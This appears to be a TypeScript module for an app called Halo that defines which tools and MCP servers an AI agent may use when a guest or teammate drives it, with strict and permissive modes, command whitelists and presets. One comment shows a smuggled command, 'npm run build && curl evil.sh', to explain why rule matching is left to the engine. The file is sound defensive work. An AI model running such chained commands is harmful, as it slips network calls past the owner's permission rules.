/**
 * Capability policy — the single contract for "which tools may an agent turn use"
 * when the turn is driven by someone other than the app's owner.
 *
 * Two scenarios share this shape, and must keep sharing it:
 *   - an IM guest talking to a digital human (`GuestPolicy`),
 *   - a teammate waking a digital human inside a team (`TeamDelegatedPolicy`).
 *
 * Renderer-safe: pure data + pure functions, no Node/Electron imports. The
 * renderer drives its switches from the same tables the main process enforces
 * with, so the UI can never offer a switch that does nothing.
 */

// ── Policy shape ──

/**
 * White-list model: only explicitly listed tools are allowed.
 * `allowedTools` undefined = no built-in restriction; `[]` = no built-in tools.
 *
 * At runtime the list is split by kind: built-in tool names drive the SDK's
 * `disallowedTools` (inverted whitelist), the boolean flags drive MCP-server
 * injection, and `allowedUserMcp` whitelists user-installed MCP servers.
 */
export interface CapabilityPolicy {
  /** Built-in tool names this caller may use. undefined = unrestricted. */
  allowedTools?: string[]

  /**
   * How far the command tool reaches once it is granted at all.
   *
   *   'full'   — any command. Unstated reads as this, so a policy written
   *              before command rules existed keeps its meaning.
   *   'listed' — only commands matching {@link bashRules}; everything else is
   *              refused. An empty list under 'listed' therefore grants
   *              nothing, which is the safe reading of "I picked the whitelist
   *              and have not written a rule yet".
   *
   * Whether the tool is granted at all is still `allowedTools` — this only
   * narrows a grant, never creates one.
   */
  bashScope?: 'full' | 'listed'

  /**
   * Commands allowed under `bashScope: 'listed'`, in Claude Code permission-rule
   * syntax (`npm run:*`, `git log *`, `ls`). Written WITHOUT the `Bash(...)`
   * wrapper — {@link buildAllowedToolRules} adds it.
   *
   * The rules are evaluated by the engine, not by Halo: it splits compound
   * commands on every shell separator and requires each part to match, which a
   * pattern test of our own would not do.
   */
  bashRules?: string[]

  // ── Halo MCP injection control ──
  allowAiBrowser?: boolean
  allowEmail?: boolean
  allowNotify?: boolean
  allowApps?: boolean
  allowFileSend?: boolean
  /** On-device OCR reads arbitrary local paths, so it is gated like the rest. */
  allowOcr?: boolean
  /**
   * Interactive terminals. A second way to run commands on the owner's machine,
   * so it belongs to the same decision as the built-in command tool — withholding
   * one while granting the other leaves the owner believing they closed a door
   * that is still open.
   */
  allowTerminal?: boolean

  /** User-installed MCP server ids (specId) this caller may use. */
  allowedUserMcp?: string[]
}

/** The boolean capability keys, so callers can iterate them exhaustively. */
export type CapabilityToggleKey =
  | 'allowAiBrowser'
  | 'allowEmail'
  | 'allowNotify'
  | 'allowApps'
  | 'allowFileSend'
  | 'allowOcr'
  | 'allowTerminal'

// ── Built-in tool universe ──

/**
 * Every SDK built-in tool name. The enforcement path inverts a whitelist against
 * this list, so a tool missing here would be silently granted. Keep it in sync
 * when upgrading the Claude Code SDK.
 *
 * The SDK `tools` option (API-level whitelist) is non-functional; `disallowedTools`
 * is the only mechanism that removes a tool from the model's pool.
 */
export const ALL_BUILTIN_TOOLS: readonly string[] = [
  'Agent',
  'AskUserQuestion',
  'Bash',
  'CronCreate',
  'CronDelete',
  'CronList',
  'Edit',
  'EnterPlanMode',
  'EnterWorktree',
  'ExitPlanMode',
  'ExitWorktree',
  'Glob',
  'Grep',
  'NotebookEdit',
  'Read',
  'Skill',
  'Task',
  'TaskOutput',
  'TaskStop',
  'TodoWrite',
  'WebFetch',
  'WebSearch',
  'Write',
]

/** Grouping of the built-in tools a policy screen lets a user switch. */
export type CapabilityToolGroup = 'file' | 'network' | 'other' | 'advanced'

/** The built-in tools a policy screen exposes, in display order. */
export const DELEGABLE_BUILTIN_TOOLS: readonly { name: string; group: CapabilityToolGroup }[] = [
  { name: 'Read', group: 'file' },
  { name: 'Glob', group: 'file' },
  { name: 'Grep', group: 'file' },
  { name: 'WebFetch', group: 'network' },
  { name: 'WebSearch', group: 'network' },
  { name: 'Agent', group: 'other' },
  { name: 'TodoWrite', group: 'other' },
  { name: 'Bash', group: 'advanced' },
  { name: 'Write', group: 'advanced' },
  { name: 'Edit', group: 'advanced' },
  { name: 'NotebookEdit', group: 'advanced' },
]

/** Group order for rendering. Labels are supplied by the screen (they differ per scenario). */
export const CAPABILITY_TOOL_GROUPS: readonly CapabilityToolGroup[] = ['file', 'network', 'other', 'advanced']

// ── MCP server universe ──

/** Halo MCP servers always available: read-only, no side effects, no local reach. */
export const CAPABILITY_SAFE_MCP: readonly string[] = ['web-search', 'halo-memory']

/**
 * Halo MCP servers gated by a policy toggle, in display order.
 *
 * `followsBuiltin` names the built-in tool a capability inherits from when its
 * own switch was never touched — for a capability that is a second door into the
 * same room, so withholding the first door withholds both. Inheriting only ever
 * *grants*, so it applies solely where silence already means yes; where the rule
 * is "nothing unless stated", nothing is inherited either.
 */
export const CAPABILITY_MCP_TOGGLES: readonly {
  server: string
  key: CapabilityToggleKey
  label: string
  followsBuiltin?: string
}[] = [
  { server: 'ai-browser', key: 'allowAiBrowser', label: 'AI Browser' },
  { server: 'halo-email', key: 'allowEmail', label: 'Email' },
  { server: 'halo-notify', key: 'allowNotify', label: 'Notifications' },
  { server: 'halo-apps', key: 'allowApps', label: 'Digital Humans' },
  { server: 'im-file-send', key: 'allowFileSend', label: 'File Send' },
  { server: 'ocr', key: 'allowOcr', label: 'Text Extraction (OCR)' },
  // A terminal is a second way onto the owner's machine, so it follows the
  // command tool: withholding commands withholds it too.
  { server: 'ai-terminal', key: 'allowTerminal', label: 'Terminal', followsBuiltin: 'Bash' },
]

const CAPABILITY_FOLLOWS_BUILTIN: ReadonlyMap<CapabilityToggleKey, string> = new Map(
  CAPABILITY_MCP_TOGGLES.flatMap((t) => (t.followsBuiltin ? [[t.key, t.followsBuiltin] as const] : []))
)

// ── Enforcement mode ──

/**
 * How an unstated permission is read:
 *   'strict'     — nothing is granted unless the policy says so. An IM guest is
 *                  a stranger, so silence means no.
 *   'permissive' — everything is granted unless the policy withholds it. A
 *                  teammate is invited into the team by the owner, so silence
 *                  means yes and the switches only ever take capabilities away.
 */
export type CapabilityMode = 'strict' | 'permissive'

// ── Derivations shared by enforcement and UI ──

/**
 * Built-in tool names to remove from the model's pool for this turn.
 *
 * In 'permissive' mode only the tools a policy screen actually exposes
 * ({@link DELEGABLE_BUILTIN_TOOLS}) can be withheld, so an all-on policy is
 * byte-identical to having no policy at all.
 */
export function computeDisallowedBuiltins(
  policy: CapabilityPolicy | undefined,
  mode: CapabilityMode
): string[] {
  const universe = mode === 'strict' ? ALL_BUILTIN_TOOLS : DELEGABLE_BUILTIN_TOOLS.map((t) => t.name)
  return universe.filter((name) => !allowsBuiltin(policy, name, mode))
}

/** Whether a built-in tool is granted under this policy. */
export function allowsBuiltin(
  policy: CapabilityPolicy | undefined,
  name: string,
  mode: CapabilityMode
): boolean {
  const listed = policy?.allowedTools
  if (listed === undefined) return mode === 'permissive'
  return listed.includes(name)
}

/** Whether a gated Halo capability is granted under this policy. */
export function allowsCapability(
  policy: CapabilityPolicy | undefined,
  key: CapabilityToggleKey,
  mode: CapabilityMode
): boolean {
  // A terminal runs whatever is typed into it, so no command rule can reach it.
  // Leaving it on beside a command whitelist would publish a list of allowed
  // commands next to an unlocked door into the same room.
  if (key === 'allowTerminal' && resolveBashAccess(policy, mode).scope !== 'full') return false
  const value = policy?.[key]
  if (typeof value === 'boolean') return value
  // Silence means no, and stays meaning no: inheriting from another switch here
  // would hand a stranger a capability whose switch the owner was never shown.
  if (mode !== 'permissive') return false
  // Silence means yes, so the only question is whether a related switch was
  // turned OFF — see `followsBuiltin` on the toggle table.
  const follows = CAPABILITY_FOLLOWS_BUILTIN.get(key)
  return follows ? allowsBuiltin(policy, follows, mode) : true
}

/** Whether a user-installed MCP server is granted under this policy. */
export function allowsUserMcp(
  policy: CapabilityPolicy | undefined,
  specId: string,
  mode: CapabilityMode
): boolean {
  const listed = policy?.allowedUserMcp
  if (listed === undefined) return mode === 'permissive'
  return listed.includes(specId)
}

/** A policy that explicitly grants everything a policy screen can grant. */
export function fullCapabilityPolicy(): CapabilityPolicy {
  return {
    allowedTools: DELEGABLE_BUILTIN_TOOLS.map((t) => t.name),
    bashScope: 'full',
    allowAiBrowser: true,
    allowEmail: true,
    allowNotify: true,
    allowApps: true,
    allowFileSend: true,
    allowOcr: true,
    allowTerminal: true,
  }
}

// ── The command tool ──

/** The command tool's reach under a policy. */
export interface BashAccess {
  scope: 'none' | 'full' | 'listed'
  /** Rule bodies (no `Bash(...)` wrapper). Empty unless scope is 'listed'. */
  rules: string[]
}

/**
 * How far this caller may go with the command tool.
 *
 * Grant and reach are two separate questions and are answered from two separate
 * fields: `allowedTools` says whether the tool exists for this caller at all,
 * `bashScope` narrows what it may run. Deriving one from the other would let the
 * two contradict each other.
 */
export function resolveBashAccess(
  policy: CapabilityPolicy | undefined,
  mode: CapabilityMode
): BashAccess {
  if (!allowsBuiltin(policy, 'Bash', mode)) return { scope: 'none', rules: [] }
  if (policy?.bashScope !== 'listed') return { scope: 'full', rules: [] }
  return { scope: 'listed', rules: normalizeBashRules(policy.bashRules) }
}

/** Drop blanks and duplicates, keeping the author's order. */
export function normalizeBashRules(rules: readonly string[] | undefined): string[] {
  if (!rules) return []
  const seen = new Set<string>()
  const out: string[] = []
  for (const raw of rules) {
    const rule = raw.trim()
    if (!rule || seen.has(rule)) continue
    seen.add(rule)
    out.push(rule)
  }
  return out
}

/**
 * The engine's auto-allow rules for this caller — what runs without reaching the
 * per-call gate.
 *
 * Command rules are handed over verbatim because the engine, not Halo, is what
 * evaluates them: it splits a compound command on every shell separator and
 * requires each part to match on its own. A rule test written here would accept
 * `npm run build && curl evil.sh` for the rule `npm run:*`.
 *
 * MCP tools are not listed: whether a caller may use one is decided by whether
 * its server was injected at all, which happens before the model ever sees it.
 */
export function buildAllowedToolRules(
  policy: CapabilityPolicy | undefined,
  mode: CapabilityMode
): string[] {
  const rules: string[] = []
  for (const { name } of DELEGABLE_BUILTIN_TOOLS) {
    if (name === 'Bash') continue
    if (allowsBuiltin(policy, name, mode)) rules.push(name)
  }
  const bash = resolveBashAccess(policy, mode)
  if (bash.scope === 'full') rules.push('Bash')
  else if (bash.scope === 'listed') rules.push(...bash.rules.map((rule) => `Bash(${rule})`))
  return rules
}

/**
 * Whether this policy withholds anything at all.
 *
 * A policy that withholds nothing is not enforced: the turn keeps the engine's
 * fast path (no per-call gate, no permission round-trips) and behaves byte-for-byte
 * as it did before a policy existed. 'strict' always enforces — there silence is
 * a refusal, so there is always something to withhold.
 */
export function isRestrictivePolicy(
  policy: CapabilityPolicy | undefined,
  mode: CapabilityMode
): boolean {
  if (mode === 'strict') return true
  if (!policy) return false
  if (computeDisallowedBuiltins(policy, mode).length > 0) return true
  if (resolveBashAccess(policy, mode).scope !== 'full') return true
  if (CAPABILITY_MCP_TOGGLES.some((toggle) => !allowsCapability(policy, toggle.key, mode))) return true
  // An explicit user-MCP list can only ever be narrower than "all of them".
  return policy.allowedUserMcp !== undefined
}

/**
 * Whether a built-in tool may run, asked per call rather than per session.
 *
 * The per-call gate needs this to fail closed on a tool that is not in
 * {@link DELEGABLE_BUILTIN_TOOLS} — a tool the owner was never shown a switch
 * for is one they never granted, and a new SDK tool must not arrive already
 * permitted.
 */
export function allowsBuiltinAtCallTime(
  policy: CapabilityPolicy | undefined,
  name: string,
  mode: CapabilityMode
): boolean {
  if (!DELEGABLE_BUILTIN_TOOLS.some((tool) => tool.name === name)) return false
  return allowsBuiltin(policy, name, mode)
}

// ── Presets ──

/**
 * The answer offered at the moment a team crosses machines (invite / join),
 * where the owner has no basis yet for a tool-by-tool decision and every
 * question asked is a question that delays the team working at all.
 *
 * Deliberately three, ordered by how much of the owner's computer they hand
 * over. They are seeds, not modes: the result is an ordinary policy the owner
 * can edit afterwards, and nothing later reads "which preset was this".
 */
export type CapabilityPresetId = 'read_only' | 'workspace' | 'full'

/**
 * Display order. The wording lives with the screen that shows it — a string
 * here would be invisible to the translation extractor, which reads the
 * renderer, and would ship untranslated.
 */
export const CAPABILITY_PRESET_IDS: readonly CapabilityPresetId[] = ['read_only', 'workspace', 'full']

/** Build the policy a preset stands for. */
export function capabilityPolicyFromPreset(preset: CapabilityPresetId): CapabilityPolicy {
  if (preset === 'full') return fullCapabilityPolicy()
  const base: CapabilityPolicy = {
    allowedTools: DELEGABLE_BUILTIN_TOOLS.filter((tool) =>
      preset === 'workspace'
        ? tool.group !== 'advanced' || tool.name !== 'Bash'
        : tool.group === 'file' || tool.group === 'network' || tool.name === 'TodoWrite'
    ).map((tool) => tool.name),
    bashScope: 'full',
    allowAiBrowser: false,
    allowEmail: false,
    allowNotify: false,
    allowApps: false,
    allowFileSend: false,
    allowOcr: preset === 'workspace',
    allowTerminal: false,
  }
  return base
}
